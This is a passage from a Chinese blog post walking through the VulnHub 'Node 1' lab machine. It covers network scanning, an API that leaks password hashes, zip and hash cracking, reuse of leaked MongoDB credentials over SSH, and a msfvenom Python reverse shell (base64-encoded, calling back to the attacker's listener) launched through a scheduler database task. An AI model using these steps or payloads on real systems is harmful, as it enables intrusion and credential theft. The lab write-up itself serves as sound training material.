@@ -1,0 +1,437 @@
+<!doctype html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8">
+    <meta name="baidu-site-verification" content="dIcXMeY8Ya">
+    
+    <title>Write-up-NODE-1 | Kali-Team</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <meta name="keywords" content="Kali-Team, 三米前有蕉皮">
+    <meta name="description" content="Kali-Team">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Kali-Team" type="application/atom+xml">
+    
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    
+    <link rel="stylesheet" href="/css/style.css">
+    <!--[if lt IE 9]>
+    <script src="/js/html5.js"></script>
+    <![endif]-->
+    
+
+</head>
+</html>
+<body class="home">
+    <!--[if lt IE 9]>
+    <div class="browsehappy">
+        当前网页 <strong>不支持</strong>
+        你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.
+    </div>
+    <![endif]-->
+
+    <!-- 博客头部 -->
+    <header class="header">
+    <section class="container header-main">
+        <div class="logo">
+            <a href="/">
+                <div class="cover">
+                    <span class="name">Kali-Team</span>
+                    <span class="description">三米前有蕉皮</span>
+                </div>
+            </a>
+        </div>
+        <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
+        <ul class="menu hidden" id="JELON__menu">
+            
+            <li rel="/2018/10/12/Write-up-NODE-1/index.html" class="item ">
+                <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
+            </li>
+            
+            <li rel="/2018/10/12/Write-up-NODE-1/index.html" class="item ">
+                <a href="/lab/" title="实验室" class="icon-lab">&nbsp;实验室</a>
+            </li>
+            
+            <li rel="/2018/10/12/Write-up-NODE-1/index.html" class="item ">
+                <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
+            </li>
+            
+            <li rel="/2018/10/12/Write-up-NODE-1/index.html" class="item ">
+                <a href="/comment/" title="留言" class="icon-comment">&nbsp;留言</a>
+            </li>
+            
+        </ul>
+        <div class="profile clearfix">
+            <div class="feeds fl">
+                
+                
+                <p class="links">
+                    
+                        <a href="https://github.com/cn-kali-team" target="_blank">Github</a>
+                        |
+                    
+                </p>
+                <p class="sns">
+                    
+                    <a href="javascript: void(0);" class="wechat">
+                        <b>■</b>
+                        公众号
+                        <span class="popover">
+                            <img src="/img/wechat_mp.jpg" width="120" height="120" alt="我的微信订阅号">
+                            <i class="arrow"></i>
+                        </span>
+                    </a>
+                </p>
+                
+            </div>
+            <div class="avatar fr">
+                <img src="/img/favicon.ico" alt="avatar" title="Kali-Team">
+            </div>
+        </div>
+    </section>
+</header>
+
+
+    <!-- 博客正文 -->
+    <div class="container body clearfix">
+        <section class="content">
+            <div class="content-main widget">
+                <!-- 文章页 -->
+<!-- 文章 -->
+<article class="post article">
+    <header class="text-center">
+        <h3 class="post-title"><span>Write-up-NODE-1</span></h3>
+    </header>
+    <p class="post-meta text-center">
+        Kali-Team 发表于
+        <time datetime="2018-10-12T09:01:23.000Z">2018-10-12</time>
+    </p>
+    <div class="post-content">
+        <h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><ul>
+<li>下载地址：<a href="https://www.vulnhub.com/entry/node-1,252/" target="_blank" rel="noopener">点我</a></li>
+<li>哔哩哔哩：<a href="https://www.bilibili.com/video/av33796982/" target="_blank" rel="noopener">哔哩哔哩</a></li>
+</ul>
+<h3 id="一天研究OBS终于不闪屏了"><a href="#一天研究OBS终于不闪屏了" class="headerlink" title="一天研究OBS终于不闪屏了"></a>一天研究OBS终于不闪屏了</h3><ul>
+<li>顺便在这里记录一下，上网查了很久。刚刚开始是不闪屏了，但是锁屏后就唤醒不了了，只能强制关机。</li>
+<li>然后又上网找了很久，重启了N次，终于试出来哪了的问题了。添加下面内容到这个文件重启就好了。</li>
+</ul>
+<a id="more"></a>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  cat /etc/X11/xorg.conf.d/20-intel.conf    </span><br><span class="line">Section "Device"</span><br><span class="line">    Identifier "Intel Graphics" </span><br><span class="line">    Driver "intel" </span><br><span class="line">    Option "AccelMethod" "uxa"</span><br><span class="line">    Option "DRI" "2"</span><br><span class="line">EndSection</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
+<h3 id="祖传开头"><a href="#祖传开头" class="headerlink" title="祖传开头"></a>祖传开头</h3><ul>
+<li>网卡：vmnet8；IP：192.168.131.1/24</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ip a show dev vmnet8</span><br><span class="line">5: vmnet8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:c0:00:08 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.131.1/24 brd 192.168.131.255 scope global vmnet8</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::250:56ff:fec0:8/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这次祖传套路好像不管用了，想是不是防火墙过滤了，然后尝试ByPass，详细可以看：<a href="https://kali-team.cn/2018/04/09/Nmap-%E6%89%AB%E6%8F%8F-%E9%98%B2%E7%81%AB%E5%A2%99-Bypass/">Nmap防火墙ByPass</a></li>
+<li>尝试到<code>sudo nmap -sn 192.168.131.1/24</code>加上sudo可以找到目标的IP，后面发现目标没有开放80或443端口，一般扫描无法找到目标IP。因为使用sudo权限Nmap会使用libpcap嗅探网络流量和发送原始网络流量，详细还是看上面的那篇文章吧。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -sn 192.168.131.1/24</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-12 20:26 CST</span><br><span class="line">Nmap scan report for 192.168.131.1</span><br><span class="line">Host is up (0.00056s latency).</span><br><span class="line">Nmap done: 256 IP addresses (1 host up) scanned in 3.08 seconds</span><br><span class="line">➜  ~ sudo nmap -sn 192.168.131.1/24</span><br><span class="line">[sudo] kali-team 的密码：</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-12 20:31 CST</span><br><span class="line">Nmap scan report for 192.168.131.141</span><br><span class="line">Host is up (0.00074s latency).</span><br><span class="line">MAC Address: 00:0C:29:22:EE:8A (VMware)</span><br><span class="line">Nmap scan report for 192.168.131.1</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (2 hosts up) scanned in 35.66 seconds</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
+<ul>
+<li>找到IP为192.168.131.141，-A接着扫，-Pn跳过主机发现直接扫，开放了22和3000端口，难怪扫不到。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -T4 -A 192.168.131.141 -Pn</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-12 20:43 CST</span><br><span class="line">Nmap scan report for 192.168.131.141</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)</span><br><span class="line">|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)</span><br><span class="line">|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)</span><br><span class="line">3000/tcp open  http    Node.js Express framework</span><br><span class="line">| hadoop-datanode-info: </span><br><span class="line">|_  Logs: /login</span><br><span class="line">| hadoop-tasktracker-info: </span><br><span class="line">|_  Logs: /login</span><br><span class="line">|_http-title: MyPlace</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.95 seconds</span><br></pre></td></tr></table></figure>
+<ul>
+<li>浏览器打开3000端口看一下，burpsuite全程抓包，到处点点。回来看请求记录。发现在日志里有几个奇怪的请求<code>http://192.168.131.141:3000/api/users/tom</code>都是json格式的。</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/users/tom</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.131.141:3000</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.131.141:3000/profiles/tom</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure>
+<ul>
+<li>返回数据，应该是在点用户的头像时请求的，试完首页的三个用户都不是管理员。猜想根据写路由的习惯，试着把用户删除掉再请求一次。</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">X-Powered-By</span>: Express</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 146</span><br><span class="line"><span class="attribute">ETag</span>: W/"92-i7KsecITBt58aCBrfJ2ziyXT+uA"</span><br><span class="line"><span class="attribute">Date</span>: Fri, 12 Oct 2018 12:54:18 GMT</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>然后就出现了了另一个管理员用户<code>myP14ceAdm1nAcc0uNT</code>，密码丢去破解得到：<code>manchester</code></li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/users</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.131.141:3000</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.131.141:3000/profiles/tom</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">X-Powered-By</span>: Express</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 611</span><br><span class="line"><span class="attribute">ETag</span>: W/"263-mJMXKDfX6c4pdWF3bLjHuBIvsM0"</span><br><span class="line"><span class="attribute">Date</span>: Fri, 12 Oct 2018 12:58:25 GMT</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">[&#123;"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true&#125;,&#123;"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false&#125;,&#123;"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false&#125;,&#123;"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false&#125;]</span><br></pre></td></tr></table></figure>
+<ul>
+<li>登录得到一个文件，下载回来判断文件类型发现是一个base64编码的纯文本，那再解码导出到文件在判断文件类型是一个zip。但是有密码加密的，所以要爆破zip密码。</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  DOWNLOAD file myplace.backup</span><br><span class="line">myplace.backup: ASCII text, <span class="keyword">with</span> very <span class="keyword">long</span> <span class="keyword">lines</span>, <span class="keyword">with</span> <span class="keyword">no</span> line terminators</span><br><span class="line">➜  DOWNLOAD cat myplace.backup|base64 -d &gt;<span class="number">2333</span></span><br><span class="line">➜  DOWNLOAD <span class="keyword">file</span> <span class="number">2333</span> </span><br><span class="line"><span class="number">2333</span>: Zip <span class="keyword">archive</span> <span class="keyword">data</span>, <span class="keyword">at</span> <span class="keyword">least</span> v1<span class="number">.0</span> <span class="keyword">to</span> <span class="keyword">extract</span></span><br><span class="line">➜  DOWNLOAD unzip <span class="number">2333</span> </span><br><span class="line"><span class="keyword">Archive</span>:  <span class="number">2333</span></span><br><span class="line">   creating: <span class="keyword">var</span>/www/myplace/</span><br><span class="line">[<span class="number">2333</span>] <span class="keyword">var</span>/www/myplace/<span class="keyword">package</span>-lock.json <span class="keyword">password</span>:</span><br></pre></td></tr></table></figure>
+<ul>
+<li>用zip2john生产zip的hash文件，在用字典攻击。因为我在之前已经破解过一次了，他保存了记录。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  DOWNLOAD zip2john 2333 &gt; pass.hash</span><br><span class="line">➜  DOWNLOAD cat pass.hash </span><br><span class="line">2333:$pkzip2$3*2*1*0*8*24*9c88*1223*332809d8492f2345d28fa927fb76c77154c6ccf048881c2600290b53514f7d6c8413b7db*1*0*8*24*37ef*0145*e3ff6a50090c46ad3e53aee3d26d04dee08c2e9c0c1b2b48e7000ddc6a84210ba178b271*2*0*11*5*118f1dfc*94cb*67*0*11*118f*3d0f*e9a06a072dc45e9904cee2aa2fa97c9cd0*$/pkzip2$:::::2333</span><br><span class="line">➜  DOWNLOAD john pass.hash --wordlist=$wordlist </span><br><span class="line">Loaded 1 password hash (PKZIP [32/64])</span><br><span class="line">No password hashes left to crack (see FAQ)</span><br><span class="line">➜  DOWNLOAD john --show pass.hash</span><br><span class="line">2333:magicword:::::2333</span><br><span class="line"></span><br><span class="line">1 password hash cracked, 0 left</span><br></pre></td></tr></table></figure>
+<ul>
+<li>我把记录删除了再演示一遍，如果再想看密码可以使用–show加hash文件查看。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  DOWNLOAD john pass.hash --wordlist=$wordlist</span><br><span class="line">Created directory: /home/kali-team/.john</span><br><span class="line">Loaded 1 password hash (PKZIP [32/64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press 'q' or Ctrl-C to abort, almost any other key for status</span><br><span class="line">magicword        (2333)</span><br><span class="line">1g 0:00:00:00 DONE (2018-10-12 23:50) 5.882g/s 1156Kp/s 1156Kc/s 1156KC/s sandrea..piggy!</span><br><span class="line">Use the "--show" option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
+<ul>
+<li>解压进入文件夹找到app.js文件，发现了一些敏感的信息。</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace';</span><br><span class="line">const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';</span><br></pre></td></tr></table></figure>
+<ul>
+<li>如果是想快一点的话可以直接使用上面的账号登录ssh上EXP提权到root权限GetFlag，如果想有点挑战的就使用下面的命令执行漏洞GetFlag，这样就不用EXP提权了。</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">app.get('/api/admin/backup', function (req, res) &#123;</span><br><span class="line">    if (req.session.user &amp;&amp; req.session.user.is_admin) &#123;</span><br><span class="line">      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);</span><br><span class="line">      var backup = '';</span><br><span class="line"></span><br><span class="line">      proc.on("exit", function(exitCode) &#123;</span><br><span class="line">        res.header("Content-Type", "text/plain");</span><br><span class="line">        res.header("Content-Disposition", "attachment; filename=myplace.backup");</span><br><span class="line">        res.send(backup);</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      proc.stdout.on("data", function(chunk) &#123;</span><br><span class="line">        backup += chunk;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      proc.stdout.on("end", function() &#123;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      res.send(&#123;</span><br><span class="line">        authenticated: false</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>先登录ssh，账号：mark，密码：5AYRft73VtFpc84k</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  DOWNLOAD ssh mark@192.168.131.141</span><br><span class="line">mark@192.168.131.141's password: </span><br><span class="line">Last login: Fri Oct 12 17:15:41 2018 from 192.168.131.1</span><br><span class="line">mark@node:~$</span><br></pre></td></tr></table></figure>
+<ul>
+<li>先用msf生成一行Python的反弹后门，在用nc监听本地的7788端口。</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  DOWNLOAD msfvenom -p cmd/unix/reverse_python <span class="attribute">lhost</span>=192.168.131.1 <span class="attribute">lport</span>=7788 R</span><br><span class="line">[-] <span class="literal">No</span> platform was selected, choosing Msf::Module::Platform::Unix <span class="keyword">from</span> the payload</span><br><span class="line">[-] <span class="literal">No</span> arch selected, selecting arch: cmd <span class="keyword">from</span> the payload</span><br><span class="line"><span class="literal">No</span> encoder <span class="keyword">or</span> badchars specified, outputting<span class="built_in"> raw </span>payload</span><br><span class="line">Payload size: 501 bytes</span><br><span class="line">python -c <span class="string">"exec('aW1wb3J0IHNvY2tldCAgICAgICwgICBzdWJwcm9jZXNzICAgICAgLCAgIG9zICAgIDsgICBob3N0PSIxOTIuMTY4LjEzMS4xIiAgICA7ICAgcG9ydD03Nzg4ICAgIDsgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgICAgICAsICAgc29ja2V0LlNPQ0tfU1RSRUFNKSAgICA7ICAgcy5jb25uZWN0KChob3N0ICAgICAgLCAgIHBvcnQpKSAgICA7ICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgLCAgIDApICAgIDsgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAsICAgMSkgICAgOyAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICwgICAyKSAgICA7ICAgcD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp'.decode('base64'))"</span></span><br><span class="line">➜  DOWNLOAD nc -lvp 7788</span><br></pre></td></tr></table></figure>
+<ul>
+<li>把shell上传到目标主机，加上可执行权限</li>
+</ul>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mark@node:/tmp$ chmod<span class="number"> 777 </span>shell.sh </span><br><span class="line">mark@node:/tmp$ ll</span><br><span class="line">total 64</span><br><span class="line">drwxrwxrwt <span class="number"> 9 </span>root    root    <span class="number"> 4096 </span>Oct<span class="number"> 12 </span>17:26 ./</span><br><span class="line">drwxr-xr-x<span class="number"> 25 </span>root    root    <span class="number"> 4096 </span>Sep <span class="number"> 2 </span><span class="number"> 2017 </span>../</span><br><span class="line">-rw-r--r-- <span class="number"> 1 </span>mark    mark    <span class="number"> 6021 </span>Oct<span class="number"> 12 </span>15:19 44298.c</span><br><span class="line">-rwxrwxr-x <span class="number"> 1 </span>mark    mark   <span class="number"> 14032 </span>Oct<span class="number"> 12 </span>15:20 a.out*</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Oct<span class="number"> 12 </span>13:19 .font-unix/</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Oct<span class="number"> 12 </span>13:19 .ICE-unix/</span><br><span class="line">srwx------ <span class="number"> 1 </span>mongodb nogroup    <span class="number"> 0 </span>Oct<span class="number"> 12 </span>13:20 mongodb-27017.sock=</span><br><span class="line">-rwxrwxrwx <span class="number"> 1 </span>mark    mark     <span class="number"> 502 </span>Oct<span class="number"> 12 </span>17:25 shell.sh*</span><br><span class="line">drwx------ <span class="number"> 3 </span>root    root    <span class="number"> 4096 </span>Oct<span class="number"> 12 </span>13:19 systemd-private-712c42b4f5194056b7eb002b805a8bad-systemd-timesyncd.service-FZdDDZ/</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Oct<span class="number"> 12 </span>13:19 .Test-unix/</span><br><span class="line">drwx------ <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Oct<span class="number"> 12 </span>13:19 vmware-root/</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Oct<span class="number"> 12 </span>13:19 .X11-unix/</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Oct<span class="number"> 12 </span>13:19 .XIM-unix/</span><br><span class="line">mark@node:/tmp$</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>利用app.js里的账号登录<code>mark@node:/tmp$ mongo -u mark -p5AYRft73VtFpc84k scheduler</code>mongodb添加任务执行反弹后门<code>db.tasks.insertOne({cmd:&quot;bash /tmp/shell.sh&quot;});</code>,要等一会儿。</p>
+</li>
+<li><p>然后反弹回来的就是tom用户的权限了，就可以拿到用户home目录的Flag了。</p>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwd </span><br><span class="line">/</span><br><span class="line">cd /home/tom</span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">e1156acc3574e04b06908ecf76be91b1</span><br><span class="line"></span><br><span class="line">tom@node:~$ ls -al /usr/local/bin</span><br><span class="line">ls -al /usr/local/bin</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x  2 root root   4096 Sep  3  2017 .</span><br><span class="line">drwxr-xr-x 10 root root   4096 Aug 29  2017 ..</span><br><span class="line">-rwsr-xr--  1 root admin 16484 Sep  3  2017 backup</span><br><span class="line">tom@node:~$</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>接着再利用上面的备份的命令执行，就是但备份的时候会用root权限执行/usr/local/bin/backup程序，当我想着把root目录打包成备份拿到root目录下的root.txt时，发现自己太天真了。拿到了暴走的那张图。</p>
+</li>
+<li><p>想直接该掉目标的app.js又发现要root权限</p>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tom@node:/var/www/myplace$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 56</span><br><span class="line">drwxr-xr-x  4 root root  4096 Sep  3  2017 .</span><br><span class="line">drwxr-xr-x  3 root root  4096 Sep  3  2017 ..</span><br><span class="line">-rw-rw-r--  1 root root  3861 Sep  2  2017 app.html</span><br><span class="line">-rw-rw-r--  1 root root  8058 Sep  3  2017 app.js</span><br><span class="line">drwxr-xr-x 69 root root  4096 Sep  2  2017 node_modules</span><br><span class="line">-rw-rw-r--  1 root root   283 Sep  2  2017 package.json</span><br><span class="line">-rw-r--r--  1 root root 21264 Sep  2  2017 package-lock.json</span><br><span class="line">drwxrwxr-x  6 root root  4096 Sep  2  2017 static</span><br><span class="line">tom@node:/var/www/myplace$</span><br></pre></td></tr></table></figure>
+<ul>
+<li>然后把backup下载回来看了一下,他是把一些目录过滤了，只要有这些字符串就调用一个函数把刚刚的暴走表情返回来。</li>
+</ul>
